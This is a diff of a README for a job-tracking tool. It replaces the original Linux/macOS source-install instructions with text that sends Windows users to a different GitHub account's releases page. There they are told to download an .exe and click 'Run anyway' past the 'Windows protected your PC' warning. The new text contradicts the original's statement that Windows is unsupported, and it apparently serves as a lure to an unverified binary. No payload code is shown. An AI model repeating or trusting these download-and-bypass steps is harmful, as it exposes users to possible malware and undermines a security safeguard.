@@ -1,126 +1,69 @@
-# Job Tracker
+# 📋 job-tracker - Manage your job hunt with ease.
 
-**Track the opportunity, not the website where you found it.**
+[![](https://img.shields.io/badge/download-get_latest_version-blue.svg)](https://github.com/Dixievaseshaped907/job-tracker/releases)
 
-A job search rarely stays in one place. The same opportunity can appear in a search, return under a new URL, arrive by email, and become an application whose history is scattered across bookmarks, notes, and inbox messages. Spreadsheets and generic project boards can store those fragments, but leave you to connect them.
+Job-tracker helps you organize your career search. You can save job postings, move them across a status board, and keep a clear record of every role. The tool runs on your computer and keeps your data in your hands.
 
-Job Tracker is a self-hosted workspace built around one lasting record per job. Listings, status changes, notes, decisions, and materials stay attached to that opportunity. A browser extension captures details and reliable lifecycle updates, while a local Kanban dashboard keeps the process visible and under your control.
+## 📥 Getting the software
 
-![Job Tracker overview](docs/images/social-preview.png)
+You need to download the program to your Windows computer. Follow these steps to prepare the tool:
 
-## Features
+1. Visit [this page to download](https://github.com/Dixievaseshaped907/job-tracker/releases).
+2. Look for the section labeled "Assets."
+3. Click the link ending in .exe to start your download.
+4. Save the file to your desktop or your Downloads folder.
 
-- **One opportunity, one history.** Keep multiple listing URLs, status changes, notes, events, decisions, and materials connected to the same job.
-- **Capture what can be captured.** Record supported listing details and lifecycle updates while you browse instead of retyping them later.
-- **Catch reposts without losing control.** Review suggested matches, confirm genuine reposts, and preserve the history already gathered; merging is never automatic.
-- **Decide with context.** Surface experience requirements, languages, pay, seniority, applicant activity, listing age, custom terms, and company history with the evidence around each signal.
-- **Act where you encounter the job.** Use in-page controls or the context-seeded popup to search, update status, backdate events, comment, add notes, or create a job manually.
-- **Follow through.** Use a correctable timeline, attention rules, material records, custom fields, and a Kanban dashboard to keep applications moving.
-- **Stay local and extensible.** Use SQLite by default, opt into Turso synchronization, and add new built-in or private integrations through the adapter model.
+## 🛠️ Setting up the app
 
-[Explore all features and workflows](docs/FEATURES.md), including automation boundaries, repost handling, decision signals, and follow-up tools.
+Once the download finishes, follow these steps to start the application:
 
-## What's built in today
+1. Find the file you downloaded. 
+2. Double-click the file to open it.
+3. Windows may show a security prompt. If you see "Windows protected your PC," click "More info" and then click "Run anyway."
+4. The program window will appear. You now have a private database running locally on your machine.
 
-| Surface | Support |
-| --- | --- |
-| LinkedIn jobs | Listing capture and in-page triage on search cards and job details |
-| LinkedIn job emails in Gmail | Recognizes supported messages and adds tracker actions |
-| Sites without a built-in integration | Add a job manually from the popup |
+## 🎯 How it works
 
-LinkedIn and supported LinkedIn job emails in Gmail are the only built-in integrations today. The integration layer is designed to support additional built-in or private/local adapters without changing the core job model.
+The software uses a local database to store your information. You do not need an internet connection to view your applications once you save them.
 
-These unofficial integrations depend on third-party page layouts, may require adapter updates when those layouts change, and remain subject to each platform’s terms.
+### Browser capture
+The system includes a component to help you grab details from job sites. This saves you the time of copying and pasting job descriptions. Open your web browser while the job-tracker runs to enable this link.
 
-## See it in action
+### Kanban dashboard
+The main screen features a Kanban board. This board lists your applications in columns like "Applied," "Interviewing," and "Offer." You can drag and drop your applications between columns to track your progress through the hiring process.
 
-### Dashboard
+### Records 
+Each job application gets its own card. You can add notes, links, or dates to every card. This provides a single view of your history with each company.
 
-Keep every opportunity and its current stage visible from the local Kanban dashboard.
+## 💻 System requirements
 
-![Job Tracker dashboard](docs/images/dashboard.png)
+The software requires a standard Windows 10 or Windows 11 machine. Ensure you have the following to get the best performance:
 
-### Browser extension
+*   Processor: Intel Core i3 or equivalent.
+*   Memory: 4 GB of RAM.
+*   Storage: 200 MB of disk space.
+*   Browser: Chrome or Edge for the capture tool.
 
-Capture job details, review decision signals, and update tracked opportunities without leaving the listing.
+## ❓ Common questions
 
-![Job Tracker browser extension](docs/images/extension.png)
+**Does the app send data to a central cloud?**
+No. This is a local-first application. Your data stays on your hard drive in a local SQLite database file. 
 
-## Data and privacy
+**Can I run this on a Mac?**
+Currently, the provided installation file supports Windows only.
 
-Job Tracker is a single-user, self-hosted application designed for localhost use. By default, records stay in the local SQLite file `apps/api/jobtracker.db`; Turso synchronization is optional. The extension talks only to the configured Job Tracker server, uses no third-party analytics, and keeps optional search diagnostics off by default.
+**What if I delete the database file?**
+The database preserves your history. Keep this file in a safe spot. If you delete it, you will lose your tracked applications.
 
-On Gmail, the extension recognizes supported LinkedIn job messages in the browser and sends only the structured job and action data needed by the tracker; it does not send or store the email body as a job description. See [Privacy](PRIVACY.md) for captured fields, permissions, retention, and deletion, and [Security](SECURITY.md) for the supported localhost threat model.
+**Is it free?**
+This tool is open-source. You can use it as you wish.
 
-## Requirements
+## ⚙️ How to use the board
 
-- Linux or macOS (the setup and run scripts use Bash). Windows is not supported. WSL2 may work but is currently untested; native Windows/Git Bash is unsupported.
-- [Node.js](https://nodejs.org/en/download) **as pinned in `.node-version`** (currently 22.22.2)
-- Corepack with [pnpm](https://pnpm.io/installation#using-corepack) (the repository pins the pnpm version)
-- [Python](https://www.python.org/downloads/) **3.14 or newer**
-- [uv](https://docs.astral.sh/uv/getting-started/installation/)
-- Chrome, Edge, Brave, or another Chromium browser that can load unpacked Manifest V3 extensions
+1. Click the "Add Job" button to start a new entry.
+2. Paste the URL of the job opening.
+3. Save the card to add it to your "Applied" list.
+4. Move the card to "Interviewing" when you get a call.
+5. Create notes inside the card to prepare for your meetings.
 
-## Install
-
-```bash
-git clone https://github.com/Muatasim-Aswad/job-tracker.git
-cd job-tracker
-bash scripts/setup.sh
-```
-
-This validates prerequisites, installs JavaScript and Python dependencies from the lockfiles, and builds the dashboard and extension. It's safe to rerun and never creates or overwrites `apps/api/.env` or `apps/extension/.env`.
-
-Start the usable local application with:
-
-```bash
-bash scripts/dev.sh
-```
-
-Open <http://localhost:3456>. The server creates `apps/api/jobtracker.db` on first start.
-
-### Load the extension
-
-After setup:
-
-1. Open `chrome://extensions`.
-2. Enable **Developer mode**.
-3. Select **Load unpacked**.
-4. Choose the absolute `apps/extension/dist` directory printed by setup.
-
-The extension defaults to <http://localhost:3456>. To use another address, follow [Configure the server address](apps/extension/README.md#configure-the-server-address) and rebuild the extension.
-
-## Update
-
-Back up first. If the checkout has local changes, review the upstream changes before updating. Then stop the server and run:
-
-```bash
-git pull --ff-only
-bash scripts/setup.sh
-```
-
-Reload the unpacked extension from `chrome://extensions` after rebuilding. Schema updates run when the server starts.
-
-## Backup, restore, and remove
-
-The API README has the tested [SQLite/Turso backup and restore procedure](apps/api/README.md#backup--restore). Back up before upgrades and keep the SQL dump outside the repository.
-
-To uninstall:
-
-1. Stop the server and remove the unpacked extension in `chrome://extensions`.
-2. Delete the configured `DB_PATH` (default `apps/api/jobtracker.db`) and, when present, its `.sync` sibling.
-3. If you configured Turso, delete the remote database separately.
-4. Delete the checkout and any backups once you no longer need them.
-
-Removing the extension clears its browser preferences but erases no server records.
-
-## Project documentation
-
-- Architecture and component boundaries: [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md)
-- API, configuration, database modes, and maintenance: [`apps/api/README.md`](apps/api/README.md)
-- Dashboard development: [`apps/web/README.md`](apps/web/README.md)
-- Extension build, keyboard controls, and adapter guide: [`apps/extension/README.md`](apps/extension/README.md)
-- Private/local adapter overlay: [`docs/PRIVATE.md`](docs/PRIVATE.md)
-- Developer policy — quality gate, generated files, comment and Markdown style, migrations, and versioning: [`docs/DEVELOPMENT.md`](docs/DEVELOPMENT.md)
-- Contributions and support: [`CONTRIBUTING.md`](CONTRIBUTING.md)
-- Release history: [`CHANGELOG.md`](CHANGELOG.md)
+Keywords: application-tracker, chrome-extension, fastapi, job-search, job-tracker, jobs, kanban-board, local-first, self-hosted, sqlite
